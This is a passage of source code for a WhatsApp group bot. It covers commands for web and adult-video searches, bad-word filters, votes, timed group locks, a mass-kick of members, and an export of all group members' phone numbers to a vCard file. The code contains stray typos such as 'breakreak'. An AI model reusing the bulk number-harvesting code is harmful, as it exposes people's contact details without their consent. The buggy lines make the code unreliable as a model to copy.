          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
        Yuta.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        replygcyuta('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      replygcyuta('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: Yuta.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
      } else {
        replygcyuta('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      replygcyuta('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
breakreak
			case 'yts': case 'ytsearch': {
  if (!text) return replygcyuta(`*Example :* ${prefix + command} title`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygcyuta('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: Yuta.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await Yuta.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygcyuta(`Error`);
  }
}
break
			case 'wikipedia': case 'wiki': {
	if (!users.registered) return IsReg() 
	if (!text) return replygcyuta(`Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygcyuta('⚠️ No results found ')
}
}
break
			case 'google': {
if (!users.registered) return IsReg() 
if (!q) return replygcyuta(`Example : ${prefix + command} ${botname}`)
replygcyuta(mess.loading)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcyuta(teks)
})
}
break
			case 'getjoinrequest':{
	if (!users.registered) return IsReg() 
	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	const response = await Yuta.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    Yuta.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  Yuta.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
			case 'addbadword': case 'addbd':
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (args.length < 1) return replygcyuta( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcyuta('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               if (args.length < 1) return replygcyuta( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcyuta('Successfully Deleted Bad Word!')
            break 
            case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcyuta(teks)
}
break
			case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].badword = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].badword = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antinsfw':
            case 'nsfw':{
                 if (!users.registered) return IsReg() 
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].ntnsfw = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].ntnsfw = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Yuta.fetchStatus(who)
    replygcyuta(bio.status)
  } catch {
    if (text) return replygcyuta(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Yuta.fetchStatus(who)
      replygcyuta(bio.status)
    } catch {
      return replygcyuta(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            if (m.chat in vote) return replygcyuta(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcyuta(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcyuta(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Yuta.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            if (!(m.chat in vote)) return replygcyuta(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcyuta('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Yuta.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            if (!(m.chat in vote)) return replygcyuta(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcyuta('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Yuta.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!(m.chat in vote)) return replygcyuta(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${Yuta.user.id}
`
Yuta.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            if (!(m.chat in vote)) return replygcyuta(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcyuta('Successfully Deleted Vote Session In This Group')
	    }
            break
break
			case 'closetime':
                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcyuta('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcyuta(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    Yuta.groupSettingUpdate(m.chat, 'announcement')
                    replygcyuta(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isAdmin && !YutaTheCreator) return replygcyuta(mess.admin)
                if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcyuta('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcyuta(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    Yuta.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcyuta(open)
                }, timer)
                break
			case 'editinfo':{
                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (args[0] === 'open') {
                    await Yuta.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcyuta(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await Yuta.groupSettingUpdate(m.chat, 'locked').then((res) => replygcyuta(`Successfully Closed Edit Group Info`))
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
			case 'getcontact': case 'getcon': {
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!(isAdmin || YutaTheCreator)) return XeonStickAdmin()
xeonbigpp = await Yuta.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
Yuta.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!(isAdmin || YutaTheCreator)) return XeonStickAdmin()
let cmiggc = await Yuta.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcyuta('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Yuta.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!m.mentionedJid[0]) return replygcyuta('\nUse like this\n Example:.sendcontact @tag name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Yuta.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!(isAdmin || YutaTheCreator)) return XeonStickAdmin()
if (!m.mentionedJid[0]) return replygcyuta('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Yuta.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
			case 'kickall': {
 if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
 if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
 if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
  const xeonkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.db.data.groups[m.chat].welcome === true) {
 global.db.data.groups[m.chat].welcome = false;
  }
 for (let remove of xeonkickall) {
 await Yuta.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcyuta(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
 if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
